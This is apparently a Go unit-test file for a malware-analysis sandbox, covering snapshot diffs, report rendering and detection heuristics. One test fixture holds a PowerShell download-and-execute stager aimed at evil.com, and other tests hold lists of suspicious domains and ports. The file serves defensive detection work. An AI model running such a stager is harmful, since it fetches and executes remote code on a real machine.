package sandbox

import (
	"strings"
	"testing"
	"time"
)

// ─── types.go ────────────────────────────────────────────────────────────────

func TestKernelEventType_String_More(t *testing.T) {
	cases := []struct {
		t    KernelEventType
		want string
	}{
		{EventFileCreate, "FileCreate"},
		{EventFileWrite, "FileWrite"},
		{EventFileDelete, "FileDelete"},
		{EventFileRename, "FileRename"},
		{EventRegSetValue, "RegSetValue"},
		{EventRegDeleteValue, "RegDeleteValue"},
		{EventRegCreateKey, "RegCreateKey"},
		{EventRegDeleteKey, "RegDeleteKey"},
		{KernelEventType(999), "Unknown"},
	}
	for _, c := range cases {
		if got := c.t.String(); got != c.want {
			t.Errorf("KernelEventType(%d).String() = %q, want %q", int(c.t), got, c.want)
		}
	}
}

// ─── types.go / Config ───────────────────────────────────────────────────────

func TestConfigNormalized_Defaults(t *testing.T) {
	cfg := Config{TargetPath: "x.exe"}
	n := cfg.normalized()
	if n.OutputDir != "analysis_output" {
		t.Errorf("OutputDir=%q", n.OutputDir)
	}
	if n.Duration != 0 {
		t.Errorf("Duration=%v", n.Duration)
	}
	if n.MaxMemoryMB != 512 {
		t.Errorf("MaxMemoryMB=%d", n.MaxMemoryMB)
	}
	if n.MonitorEvery != time.Second {
		t.Errorf("MonitorEvery=%v", n.MonitorEvery)
	}
	if n.TimeScaleFactor != 1.0 {
		t.Errorf("TimeScaleFactor=%v", n.TimeScaleFactor)
	}
}

func TestConfigNormalized_PreservesExisting(t *testing.T) {
	cfg := Config{
		TargetPath:      "x.exe",
		OutputDir:       "custom_out",
		Duration:        30 * time.Second,
		MaxMemoryMB:     256,
		MonitorEvery:    500 * time.Millisecond,
		TimeScaleFactor: 2.5,
	}
	n := cfg.normalized()
	if n.OutputDir != "custom_out" {
		t.Errorf("OutputDir=%q", n.OutputDir)
	}
	if n.Duration != 30*time.Second {
		t.Errorf("Duration=%v", n.Duration)
	}
	if n.MaxMemoryMB != 256 {
		t.Errorf("MaxMemoryMB=%d", n.MaxMemoryMB)
	}
	if n.TimeScaleFactor != 2.5 {
		t.Errorf("TimeScaleFactor=%v", n.TimeScaleFactor)
	}
}

func TestConfigValidate(t *testing.T) {
	cases := []struct {
		name    string
		cfg     Config
		wantErr bool
		errSub  string
	}{
		{
			name:    "no target",
			cfg:     Config{Duration: 10 * time.Second, MaxMemoryMB: 512},
			wantErr: true,
			errSub:  "target path",
		},
		{
			name:    "duration too short",
			cfg:     Config{TargetPath: "x.exe", Duration: 2 * time.Second, MaxMemoryMB: 512},
			wantErr: true,
			errSub:  "duration",
		},
		{
			name:    "memory too low",
			cfg:     Config{TargetPath: "x.exe", Duration: 10 * time.Second, MaxMemoryMB: 64},
			wantErr: true,
			errSub:  "memory",
		},
		{
			name:    "monitor interval too short",
			cfg:     Config{TargetPath: "x.exe", Duration: 10 * time.Second, MaxMemoryMB: 512, MonitorEvery: 10 * time.Millisecond},
			wantErr: true,
			errSub:  "monitor",
		},
		{
			name: "valid config",
			cfg:  Config{TargetPath: "x.exe", Duration: 30 * time.Second, MaxMemoryMB: 512},
		},
		{
			name: "monitor 0 is allowed",
			cfg:  Config{TargetPath: "x.exe", Duration: 30 * time.Second, MaxMemoryMB: 512, MonitorEvery: 0},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := c.cfg.Validate()
			if c.wantErr {
				if err == nil {
					t.Fatalf("expected error containing %q, got nil", c.errSub)
				}
				if !strings.Contains(err.Error(), c.errSub) {
					t.Errorf("error %q does not contain %q", err.Error(), c.errSub)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// ─── sandbox.go ──────────────────────────────────────────────────────────────

func TestConnectionKey(t *testing.T) {
	conn := ObservedConnection{
		Protocol:   "TCP",
		LocalAddr:  "10.0.0.1:5000",
		RemoteAddr: "8.8.8.8:443",
		State:      "ESTABLISHED",
		PID:        42,
	}
	key := connectionKey(conn)
	if !strings.Contains(key, "TCP") {
		t.Errorf("key missing protocol: %q", key)
	}
	if !strings.Contains(key, "42") {
		t.Errorf("key missing PID: %q", key)
	}
	// Same connection → same key.
	if connectionKey(conn) != key {
		t.Error("connectionKey should be deterministic")
	}
}

func TestDiffRegistrySnapshots(t *testing.T) {
	before := map[string]RegistryValue{
		"key1": {Key: "HKCU\\Run", Name: "loader", Type: "REG_SZ", Data: "old.exe"},
		"key2": {Key: "HKCU\\Run", Name: "stable", Type: "REG_SZ", Data: "same"},
	}
	after := map[string]RegistryValue{
		"key2": {Key: "HKCU\\Run", Name: "stable", Type: "REG_SZ", Data: "same"},
		"key3": {Key: "HKCU\\Run", Name: "newentry", Type: "REG_SZ", Data: "payload.exe"},
	}

	changes := diffRegistrySnapshots(before, after)

	if len(changes.Deleted) != 1 || changes.Deleted[0].Name != "loader" {
		t.Errorf("deleted=%+v", changes.Deleted)
	}
	if len(changes.Added) != 1 || changes.Added[0].Name != "newentry" {
		t.Errorf("added=%+v", changes.Added)
	}
	if len(changes.Modified) != 0 {
		t.Errorf("modified=%+v", changes.Modified)
	}
}

func TestDiffRegistrySnapshots_Modified(t *testing.T) {
	before := map[string]RegistryValue{
		"k": {Key: "K", Name: "v", Type: "REG_SZ", Data: "before"},
	}
	after := map[string]RegistryValue{
		"k": {Key: "K", Name: "v", Type: "REG_SZ", Data: "after"},
	}
	changes := diffRegistrySnapshots(before, after)
	if len(changes.Modified) != 1 {
		t.Errorf("expected 1 modified, got %d", len(changes.Modified))
	}
	if changes.Modified[0].Data != "after" {
		t.Errorf("modified data=%q", changes.Modified[0].Data)
	}
}

func TestRegistryValueKey(t *testing.T) {
	v := RegistryValue{Key: "HKCU\\Run", Name: "app"}
	k := registryValueKey(v)
	if k != "HKCU\\Run|app" {
		t.Errorf("registryValueKey=%q", k)
	}
}

func TestParsePID(t *testing.T) {
	if parsePID("1234") != 1234 {
		t.Errorf("parsePID(\"1234\")=%d", parsePID("1234"))
	}
	if parsePID("0") != 0 {
		t.Errorf("parsePID(\"0\")=%d", parsePID("0"))
	}
	if parsePID("notanumber") != 0 {
		t.Errorf("parsePID(\"notanumber\")=%d", parsePID("notanumber"))
	}
}

func TestParseNetstatOutput_FilterByPID(t *testing.T) {
	raw := "TCP 127.0.0.1:80 0.0.0.0:0 LISTENING 100\n" +
		"TCP 127.0.0.1:81 0.0.0.0:0 LISTENING 999\n" +
		"UDP 0.0.0.0:53 *:* 100\n"
	pids := map[int]struct{}{100: {}}
	conns := parseNetstatOutput(raw, pids)
	for _, c := range conns {
		if c.PID != 100 {
			t.Errorf("unexpected PID %d in connection %+v", c.PID, c)
		}
	}
}

func TestIsAndroidSandboxInputType(t *testing.T) {
	trueCases := []string{"APKFile", "DEXFile", "SmaliFolder", "CacheFolder", "ArchiveFile"}
	falseCases := []string{"", "exe", "Directory", "PatchFile", "Unknown"}
	for _, tc := range trueCases {
		if !isAndroidSandboxInputType(tc) {
			t.Errorf("isAndroidSandboxInputType(%q) should be true", tc)
		}
	}
	for _, tc := range falseCases {
		if isAndroidSandboxInputType(tc) {
			t.Errorf("isAndroidSandboxInputType(%q) should be false", tc)
		}
	}
}

func TestDetectSandboxInputType_Directory(t *testing.T) {
	// Pass a non-existent path with isDir=true — should return "Directory"
	// (DetectAndroidInputType returns error for non-existent paths)
	result := detectSandboxInputType("/nonexistent/path", true)
	if result != "Directory" {
		t.Errorf("got %q, want Directory", result)
	}
}

func TestDetectSandboxInputType_Extension(t *testing.T) {
	result := detectSandboxInputType("malware.EXE", false)
	if result != "exe" {
		t.Errorf("got %q, want exe", result)
	}
}

// ─── observationCollector ────────────────────────────────────────────────────

func TestObservationCollector_MergeAndExport(t *testing.T) {
	col := newObservationCollector()
	now := time.Now().UTC()

	col.Merge([]ObservedProcess{
		{PID: 1, Name: "first.exe"},
		{PID: 2, Name: "second.exe"},
	}, []ObservedConnection{
		{Protocol: "TCP", LocalAddr: "0.0.0.0:80", RemoteAddr: "1.2.3.4:443", State: "ESTABLISHED", PID: 1},
	}, now)

	// Duplicate merge should be idempotent for processes
	col.Merge([]ObservedProcess{
		{PID: 1, Name: "first.exe"},
	}, nil, now.Add(time.Second))

	col.AddWarning("w1")
	col.AddWarning("w1") // duplicate
	col.AddWarning("w2")

	procs, conns, warnings := col.Export()
	if len(procs) != 2 {
		t.Errorf("expected 2 procs, got %d", len(procs))
	}
	if len(conns) != 1 {
		t.Errorf("expected 1 conn, got %d", len(conns))
	}
	if len(warnings) != 2 {
		t.Errorf("expected 2 warnings (deduped), got %d", len(warnings))
	}
}

func TestObservationCollector_SortedExport(t *testing.T) {
	col := newObservationCollector()
	t1 := time.Now().UTC()
	t2 := t1.Add(time.Second)

	col.Merge([]ObservedProcess{
		{PID: 10, Name: "later.exe"},
	}, nil, t2)
	col.Merge([]ObservedProcess{
		{PID: 5, Name: "earlier.exe"},
	}, nil, t1)

	procs, _, _ := col.Export()
	if len(procs) == 2 && procs[0].PID != 5 {
		t.Errorf("expected PID 5 first (earlier), got PID %d", procs[0].PID)
	}
}

// ─── behavior.go ─────────────────────────────────────────────────────────────

func TestIsPublicRemoteAddress(t *testing.T) {
	trueAddr := []string{
		"8.8.8.8:53",
		"93.184.216.34:80",
		"1.1.1.1:443",
	}
	falseAddr := []string{
		"",
		"*:*",
		"127.0.0.1:80",
		"10.0.0.1:9090",
		"192.168.1.1:443",
		"[::1]:80",
		"notanip",
	}
	for _, a := range trueAddr {
		if !isPublicRemoteAddress(a) {
			t.Errorf("isPublicRemoteAddress(%q) should be true", a)
		}
	}
	for _, a := range falseAddr {
		if isPublicRemoteAddress(a) {
			t.Errorf("isPublicRemoteAddress(%q) should be false", a)
		}
	}
}

func TestStrconvItoa(t *testing.T) {
	cases := []struct{ in, want int }{
		{0, 0},
		{1, 1},
		{42, 42},
		{-7, -7},
		{100, 100},
		{-123, -123},
	}
	for _, c := range cases {
		got := strconvItoa(c.in)
		wantStr := strconvItoa(c.want)
		if got != wantStr {
			t.Errorf("strconvItoa(%d)=%q, want %q", c.in, got, wantStr)
		}
	}
	// Spot-check negative
	if strconvItoa(-7) != "-7" {
		t.Errorf("strconvItoa(-7) = %q", strconvItoa(-7))
	}
	if strconvItoa(0) != "0" {
		t.Errorf("strconvItoa(0) = %q", strconvItoa(0))
	}
}

func TestMaxInt(t *testing.T) {
	if maxInt(3, 5) != 5 {
		t.Errorf("maxInt(3,5)=%d", maxInt(3, 5))
	}
	if maxInt(5, 3) != 5 {
		t.Errorf("maxInt(5,3)=%d", maxInt(5, 3))
	}
	if maxInt(4, 4) != 4 {
		t.Errorf("maxInt(4,4)=%d", maxInt(4, 4))
	}
	if maxInt(0, -1) != 0 {
		t.Errorf("maxInt(0,-1)=%d", maxInt(0, -1))
	}
}

func TestLooksLikePersistencePath(t *testing.T) {
	truePaths := []string{
		"c:/users/startup/something.exe",
		"c:/autorun/bad.exe",
		"c:/runonce/payload.bat",
		"start menu/programs/startup/evil.lnk",
	}
	falsePaths := []string{
		"workspace/documents/file.txt",
		"temp/data.bin",
	}
	for _, p := range truePaths {
		if !looksLikePersistencePath(p) {
			t.Errorf("looksLikePersistencePath(%q) should be true", p)
		}
	}
	for _, p := range falsePaths {
		if looksLikePersistencePath(p) {
			t.Errorf("looksLikePersistencePath(%q) should be false", p)
		}
	}
}

func TestPluralize(t *testing.T) {
	if pluralize(1, "Spawned %d process", "Spawned %d processes") != "Spawned 1 process" {
		t.Errorf("singular failed: %q", pluralize(1, "Spawned %d process", "Spawned %d processes"))
	}
	if pluralize(3, "Spawned %d process", "Spawned %d processes") != "Spawned 3 processes" {
		t.Errorf("plural failed: %q", pluralize(3, "Spawned %d process", "Spawned %d processes"))
	}
}

func TestBuildBehaviorSummary_NilAndroidProfile(t *testing.T) {
	report := &Report{
		Processes:   []ObservedProcess{{PID: 1}},
		Connections: []ObservedConnection{{RemoteAddr: "127.0.0.1:80"}},
	}
	summary := buildBehaviorSummary(report)
	if summary.PermissionWarningCount != 0 {
		t.Errorf("expected 0 permission warnings, got %d", summary.PermissionWarningCount)
	}
	if summary.PublicConnectionCount != 0 {
		t.Errorf("expected 0 public connections (loopback), got %d", summary.PublicConnectionCount)
	}
}

func TestSummarizeHighlights_NotExecuted(t *testing.T) {
	report := &Report{
		Executed:            false,
		ExecutionSkipReason: "target is a directory; static inspection only",
	}
	summary := BehaviorSummary{}
	highlights := summarizeHighlights(report, summary)
	found := false
	for _, h := range highlights {
		if strings.Contains(h, "Execution skipped") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected 'Execution skipped' highlight, got: %v", highlights)
	}
}

func TestSummarizeHighlights_NetworkBlocked(t *testing.T) {
	report := &Report{Executed: true, NetworkMode: "blocked"}
	highlights := summarizeHighlights(report, BehaviorSummary{})
	found := false
	for _, h := range highlights {
		if strings.Contains(h, "Network access was blocked") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected network-blocked highlight, got: %v", highlights)
	}
}

// ─── exploit_analysis.go ─────────────────────────────────────────────────────

func TestSplitAddress(t *testing.T) {
	cases := []struct {
		addr, wantHost, wantPort string
	}{
		{"", "", ""},
		{"*:*", "", ""},
		{"8.8.8.8:53", "8.8.8.8", "53"},
		{"[::1]:80", "::1", "80"},
		{"10.0.0.1", "10.0.0.1", ""},
		{"host:with:colons", "host:with", "colons"},
	}
	for _, c := range cases {
		h, p := splitAddress(c.addr)
		if h != c.wantHost || p != c.wantPort {
			t.Errorf("splitAddress(%q)=(%q,%q), want (%q,%q)", c.addr, h, p, c.wantHost, c.wantPort)
		}
	}
}

func TestIsPublicIP(t *testing.T) {
	trueCases := []string{"8.8.8.8", "1.1.1.1", "93.184.216.34"}
	falseCases := []string{"127.0.0.1", "10.0.0.1", "192.168.0.1", "::1", "notanip", ""}
	for _, ip := range trueCases {
		if !isPublicIP(ip) {
			t.Errorf("isPublicIP(%q) should be true", ip)
		}
	}
	for _, ip := range falseCases {
		if isPublicIP(ip) {
			t.Errorf("isPublicIP(%q) should be false", ip)
		}
	}
}

func TestRiskyNetworkPort(t *testing.T) {
	risky := []string{"22", "23", "445", "3389", "4444", "5555", "5900"}
	notRisky := []string{"80", "443", "8080", "0", "65535"}
	for _, p := range risky {
		if !riskyNetworkPort(p) {
			t.Errorf("riskyNetworkPort(%q) should be true", p)
		}
	}
	for _, p := range notRisky {
		if riskyNetworkPort(p) {
			t.Errorf("riskyNetworkPort(%q) should be false", p)
		}
	}
}

func TestSeverityForPort(t *testing.T) {
	if s := severityForPort("22"); s != 7 {
		t.Errorf("severityForPort(22)=%d", s)
	}
	if s := severityForPort("80"); s != 5 {
		t.Errorf("severityForPort(80)=%d", s)
	}
	if s := severityForPort("8080"); s != 5 {
		t.Errorf("severityForPort(8080)=%d", s)
	}
	if s := severityForPort("12345"); s != 4 {
		t.Errorf("severityForPort(12345)=%d", s)
	}
}

func TestSuspiciousDomainName(t *testing.T) {
	trueCases := []string{
		"update.duckdns.org",
		"payload.no-ip.com",
		"paste.pastebin.com",
		"api.ngrok.io",
		"abcdef1234567890abcdef1234567890.evil.com", // long hex subdomain
	}
	falseCases := []string{
		"",
		"google.com",
		"microsoft.com",
		"example.org",
		"short.io",
	}
	for _, d := range trueCases {
		if !suspiciousDomainName(d) {
			t.Errorf("suspiciousDomainName(%q) should be true", d)
		}
	}
	for _, d := range falseCases {
		if suspiciousDomainName(d) {
			t.Errorf("suspiciousDomainName(%q) should be false", d)
		}
	}
}

func TestMostlyHex(t *testing.T) {
	if !mostlyHex("abcdef1234567890") {
		t.Error("should be mostly hex")
	}
	if mostlyHex("helloworld") {
		t.Error("helloworld is not mostly hex")
	}
	if !mostlyHex("aaaa1111bbbb2222") {
		t.Error("aaaa1111bbbb2222 should be mostly hex")
	}
}

func TestClassifyCachePath(t *testing.T) {
	cases := []struct {
		path        string
		wantType    string
		wantNonzero bool
	}{
		// Executable in cache
		{"/cache/dropped.exe", "executable_cache_artifact", true},
		{"/tmp/loader.dll", "executable_cache_artifact", true},
		{"/temp/run.bat", "executable_cache_artifact", true},
		// Sensitive names
		{"/cache/session_token.db", "sensitive_cache_artifact", true},
		{"/localappdata/cookie.json", "sensitive_cache_artifact", true},
		// Structured (no sensitive keyword)
		{"/cache/prefs.json", "structured_cache_artifact", true},
		// Numeric extension
		{"/cache/datafile.123", "opaque_cache_artifact", true},
		// Not in a cache path
		{"/home/user/file.txt", "", false},
		// Sensitive keyword in default extension
		{"/tmp/credential", "sensitive_cache_artifact", true},
	}
	for _, c := range cases {
		got, sev := classifyCachePath(c.path)
		if c.wantNonzero {
			if got != c.wantType {
				t.Errorf("classifyCachePath(%q) type=%q, want %q", c.path, got, c.wantType)
			}
			if sev <= 0 {
				t.Errorf("classifyCachePath(%q) severity=%d, want >0", c.path, sev)
			}
		} else {
			if got != "" {
				t.Errorf("classifyCachePath(%q) type=%q, want empty", c.path, got)
			}
		}
	}
}

func TestNumericExt(t *testing.T) {
	if !numericExt(".123") {
		t.Error(".123 should be numeric ext")
	}
	if !numericExt(".0") {
		t.Error(".0 should be numeric ext")
	}
	if numericExt(".txt") {
		t.Error(".txt should not be numeric ext")
	}
	if numericExt(".") {
		t.Error(". should not be numeric ext (empty after trim)")
	}
	if numericExt("") {
		t.Error("empty should not be numeric ext")
	}
}

func TestCacheDescription(t *testing.T) {
	types := []string{
		"executable_cache_artifact",
		"sensitive_cache_artifact",
		"structured_cache_artifact",
		"opaque_cache_artifact",
		"unknown_type",
	}
	for _, tp := range types {
		desc := cacheDescription(tp)
		if desc == "" {
			t.Errorf("cacheDescription(%q) returned empty", tp)
		}
	}
}

func TestClampScore(t *testing.T) {
	if clampScore(150) != 100 {
		t.Errorf("clampScore(150)=%d", clampScore(150))
	}
	if clampScore(-5) != 0 {
		t.Errorf("clampScore(-5)=%d", clampScore(-5))
	}
	if clampScore(50) != 50 {
		t.Errorf("clampScore(50)=%d", clampScore(50))
	}
	if clampScore(0) != 0 {
		t.Errorf("clampScore(0)=%d", clampScore(0))
	}
	if clampScore(100) != 100 {
		t.Errorf("clampScore(100)=%d", clampScore(100))
	}
}

func TestAnalyzeExploitability_NilReport(t *testing.T) {
	result := analyzeExploitability(nil)
	if result == nil {
		t.Fatal("analyzeExploitability(nil) should not return nil")
	}
	if result.RiskScore != 0 {
		t.Errorf("expected 0 risk, got %d", result.RiskScore)
	}
}

func TestAnalyzeMemory_NilReport(t *testing.T) {
	result := analyzeMemory(nil)
	if result == nil {
		t.Fatal("analyzeMemory(nil) should not return nil")
	}
}

func TestAnalyzeCacheArtifacts_NilReport(t *testing.T) {
	result := analyzeCacheArtifacts(nil)
	if result == nil {
		t.Fatal("analyzeCacheArtifacts(nil) should not return nil")
	}
}

func TestAnalyzeExploitability_ScriptStager(t *testing.T) {
	report := &Report{
		Processes: []ObservedProcess{
			{PID: 42, CommandLine: "powershell -nop iex (New-Object Net.WebClient).DownloadString('http://evil.com')"},
		},
	}
	analysis := analyzeExploitability(report)
	found := false
	for _, c := range analysis.Candidates {
		if c.Type == "script_stager" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected script_stager candidate, got %+v", analysis.Candidates)
	}
}

func TestAnalyzeExploitability_OpaqueTLS(t *testing.T) {
	report := &Report{
		NetworkCapture: &NetworkCapture{
			TLSMetadata: []TLSConnection{
				{RemoteAddr: "1.2.3.4", RemotePort: 443, SNI: "", ProcessID: 1},
			},
		},
	}
	analysis := analyzeExploitability(report)
	found := false
	for _, c := range analysis.Candidates {
		if c.Type == "opaque_tls" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected opaque_tls candidate, got %+v", analysis.Candidates)
	}
}

// ─── anti_sandbox.go ─────────────────────────────────────────────────────────

func TestIsHardwareAPI(t *testing.T) {
	hardwareCases := []string{
		"GetSystemInfo",
		"GlobalMemoryStatusEx",
		"GetDiskFreeSpaceExA",
		"GetDiskFreeSpaceExW",
	}
	notHardwareCases := []string{
		"CreateFile",
		"VirtualAlloc",
		"Sleep",
	}
	for _, api := range hardwareCases {
		if !IsHardwareAPI(api) {
			t.Errorf("IsHardwareAPI(%q) should be true", api)
		}
	}
	for _, api := range notHardwareCases {
		if IsHardwareAPI(api) {
			t.Errorf("IsHardwareAPI(%q) should be false", api)
		}
	}
}

func TestIndexOfSubstring(t *testing.T) {
	cases := []struct {
		s, sub string
		want   int
	}{
		{"hello world", "world", 6},
		{"hello", "", 0},
		{"hello", "hello", 0},
		{"hello", "xyz", -1},
		{"", "a", -1},
		{"a", "ab", -1},
	}
	for _, c := range cases {
		got := indexOfSubstring(c.s, c.sub)
		if got != c.want {
			t.Errorf("indexOfSubstring(%q,%q)=%d, want %d", c.s, c.sub, got, c.want)
		}
	}
}

// ─── sandbox.go / renderMarkdownReport ───────────────────────────────────────

func TestRenderMarkdownReport_WithProcessesAndConnections(t *testing.T) {
	report := &Report{
		SessionID:      "20240101_120000",
		TargetOriginal: "bad.exe",
		TargetCopied:   "workspace/bad.exe",
		InputType:      "exe",
		NetworkMode:    "live",
		Executed:       true,
		StartedAt:      time.Now().UTC(),
		FinishedAt:     time.Now().UTC().Add(5 * time.Second),
		DurationMS:     5000,
		StdoutPath:     "stdout.log",
		StderrPath:     "stderr.log",
		Processes: []ObservedProcess{
			{PID: 1000, ParentPID: 0, Name: "bad.exe", ExecutablePath: "C:/workspace/bad.exe", CommandLine: "bad.exe --run"},
		},
		Connections: []ObservedConnection{
			{PID: 1000, Protocol: "TCP", LocalAddr: "10.0.0.1:49152", RemoteAddr: "8.8.8.8:53", State: "ESTABLISHED"},
		},
		FileChanges: FileChanges{
			Created:  []FileArtifact{{Path: "new.dat", Size: 100, SHA256: "abc"}},
			Modified: []FileArtifact{{Path: "changed.txt", Size: 50, SHA256: "def"}},
			Deleted:  []FileArtifact{{Path: "gone.bin", Size: 10, SHA256: "ghi"}},
		},
		Warnings: []string{"test warning"},
		SandboxPermissions: SandboxPermissions{
			NetworkAccess:         "live",
			CanSpawnProcesses:     true,
			MaxProcessCount:       64,
			MaxMemoryMB:           512,
			ExposedWritePaths:     []string{"/workspace"},
			MonitoredRegistryKeys: []string{`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`},
			Notes:                 []string{"test note"},
		},
		EffectiveConfig: &EffectiveConfig{
			SandboxProfile:  "default",
			OutputDir:       "out",
			DurationSeconds: 60,
			TimeScaleFactor: 1.0,
		},
		RedirectedEnv: RedirectedEnv{
			UserProfile: "/home", AppData: "/appdata",
		},
		RequestedComponents: []string{"kernel_monitor"},
		StartedComponents:   []string{"kernel_monitor"},
		DegradedComponents:  []ComponentStatus{{Name: "vss", Phase: "start", Reason: "driver missing"}},
	}

	md := renderMarkdownReport(report)
	for _, want := range []string{
		"# Sandbox Report",
		"20240101_120000",
		"bad.exe",
		"Processes",
		"Connections",
		"8.8.8.8",
		"File Changes",
		"Created",
		"Modified",
		"Deleted",
		"Registry Changes",
		"Warnings",
		"Sandbox Permissions",
		"Redirected Environment",
		"Effective Sandbox Config",
		"Degraded Components",
	} {
		if !strings.Contains(md, want) {
			t.Errorf("markdown missing %q", want)
		}
	}
}

func TestRenderMarkdownReport_WithAndroidProfile(t *testing.T) {
	report := &Report{
		StartedAt:  time.Now().UTC(),
		FinishedAt: time.Now().UTC(),
		AndroidProfile: &AndroidProfile{
			PackageName:              "com.evil.app",
			AppLabel:                 "EvilApp",
			VersionName:              "1.0",
			VersionCode:              "1",
			MinSDK:                   "21",
			TargetSDK:                "33",
			HighRiskPermissionCount:  2,
			DangerousPermissionCount: 3,
			Permissions: []AndroidPermission{
				{Name: "android.permission.CAMERA", Risk: "dangerous", Suspicious: true},
			},
			ExportedComponents: []AndroidComponent{
				{Kind: "activity", Name: "MainActivity", Exported: true},
				{Kind: "receiver", Name: "BootReceiver", Exported: false},
			},
		},
		AndroidSDK: &AndroidSDKStatus{
			Detected:          true,
			Root:              "/sdk",
			Source:            "env",
			BuildToolsVersion: "34.0.0",
			ADBPath:           "/sdk/platform-tools/adb",
		},
		SandboxPermissions: SandboxPermissions{NetworkAccess: "live"},
		RedirectedEnv:      RedirectedEnv{},
	}

	md := renderMarkdownReport(report)
	for _, want := range []string{
		"Android Profile",
		"com.evil.app",
		"EvilApp",
		"Android SDK",
		"/sdk",
		"adb",
	} {
		if !strings.Contains(md, want) {
			t.Errorf("markdown missing %q", want)
		}
	}
}

func TestRenderMarkdownReport_ExecutionSkipped(t *testing.T) {
	report := &Report{
		StartedAt:           time.Now().UTC(),
		FinishedAt:          time.Now().UTC(),
		Executed:            false,
		ExecutionSkipReason: "target is a directory; static inspection only",
		SandboxPermissions:  SandboxPermissions{NetworkAccess: "live"},
		RedirectedEnv:       RedirectedEnv{},
	}
	md := renderMarkdownReport(report)
	if !strings.Contains(md, "Execution skipped") {
		t.Errorf("markdown missing execution-skipped line; got:\n%s", md[:minInt(len(md), 500)])
	}
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func TestDiffSnapshots_EmptyBefore(t *testing.T) {
	before := map[string]fileFingerprint{}
	after := map[string]fileFingerprint{
		"new.txt": {Path: "new.txt", Size: 5, SHA256: "abc"},
	}
	changes := diffSnapshots(before, after)
	if len(changes.Created) != 1 {
		t.Errorf("expected 1 created, got %d", len(changes.Created))
	}
	if len(changes.Deleted) != 0 || len(changes.Modified) != 0 {
		t.Errorf("unexpected changes: %+v", changes)
	}
}

func TestDiffSnapshots_EmptyAfter(t *testing.T) {
	before := map[string]fileFingerprint{
		"old.txt": {Path: "old.txt", Size: 5, SHA256: "abc"},
	}
	after := map[string]fileFingerprint{}
	changes := diffSnapshots(before, after)
	if len(changes.Deleted) != 1 {
		t.Errorf("expected 1 deleted, got %d", len(changes.Deleted))
	}
}

func TestSortReport(t *testing.T) {
	t1 := time.Now()
	t2 := t1.Add(time.Second)
	report := &Report{
		Warnings: []string{"zzz", "aaa", "mmm"},
		Processes: []ObservedProcess{
			{PID: 10, FirstSeen: t2},
			{PID: 5, FirstSeen: t1},
		},
		Connections: []ObservedConnection{
			{PID: 10, Protocol: "TCP", LocalAddr: "1", RemoteAddr: "2", State: "S", FirstSeen: t2},
			{PID: 5, Protocol: "UDP", LocalAddr: "3", RemoteAddr: "4", State: "", FirstSeen: t1},
		},
	}
	sortReport(report)
	if report.Warnings[0] != "aaa" {
		t.Errorf("warnings not sorted: %v", report.Warnings)
	}
	if report.Processes[0].PID != 5 {
		t.Errorf("processes not sorted by time: first PID=%d", report.Processes[0].PID)
	}
}

func TestMaskUsernameInPath(t *testing.T) {
	t.Setenv("USERNAME", "alice")
	tests := []struct {
		in   string
		want string
	}{
		{`C:\Users\alice\AppData\Local\Temp\sample.exe`, `C:\Users\%USERNAME%\AppData\Local\Temp\sample.exe`},
		{`C:\USERS\ALICE\workspace\results`, `C:\Users\%USERNAME%\workspace\results`},
		{`/Users/alice/Library/Caches`, `/Users/%USERNAME%/Library/Caches`},
		{`/home/alice/.config`, `/home/%USERNAME%/.config`},
		{`C:\Windows\System32\cmd.exe`, `C:\Windows\System32\cmd.exe`},
		{"", ""},
	}
	for _, tc := range tests {
		got := maskUsernameInPath(tc.in)
		if got != tc.want {
			t.Errorf("maskUsernameInPath(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestSanitizeReportPaths(t *testing.T) {
	t.Setenv("USERNAME", "bob")
	rep := &Report{
		TargetOriginal: `C:\Users\bob\AppData\Local\Temp\mal.exe`,
		TargetCopied:   `C:\Users\Public\input\mal.exe`,
		StdoutPath:     `C:\Users\bob\workspace\stdout.log`,
		StderrPath:     `C:\Users\bob\workspace\stderr.log`,
		EffectiveConfig: &EffectiveConfig{
			OutputDir: `C:\Users\bob\workspace\out`,
		},
	}
	san := sanitizeReportPaths(rep)
	if san.TargetOriginal != `C:\Users\%USERNAME%\AppData\Local\Temp\mal.exe` {
		t.Errorf("sanitized TargetOriginal = %q", san.TargetOriginal)
	}
	if san.StdoutPath != `C:\Users\%USERNAME%\workspace\stdout.log` {
		t.Errorf("sanitized StdoutPath = %q", san.StdoutPath)
	}
	if san.EffectiveConfig.OutputDir != `C:\Users\%USERNAME%\workspace\out` {
		t.Errorf("sanitized OutputDir = %q", san.EffectiveConfig.OutputDir)
	}
	// Verify original report is not mutated
	if rep.TargetOriginal != `C:\Users\bob\AppData\Local\Temp\mal.exe` {
		t.Errorf("original report was mutated: %q", rep.TargetOriginal)
	}
}

func TestUnmaskUsernameInPath(t *testing.T) {
	t.Setenv("USERNAME", "alice")
	tests := []struct {
		in   string
		want string
	}{
		{`C:\Users\%USERNAME%\AppData\Local\Temp\sample.exe`, `C:\Users\alice\AppData\Local\Temp\sample.exe`},
		{`/home/%USERNAME%/.config`, `/home/alice/.config`},
		{`C:\Windows\System32\cmd.exe`, `C:\Windows\System32\cmd.exe`},
		{"", ""},
	}
	for _, tc := range tests {
		got := unmaskUsernameInPath(tc.in)
		if got != tc.want {
			t.Errorf("unmaskUsernameInPath(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
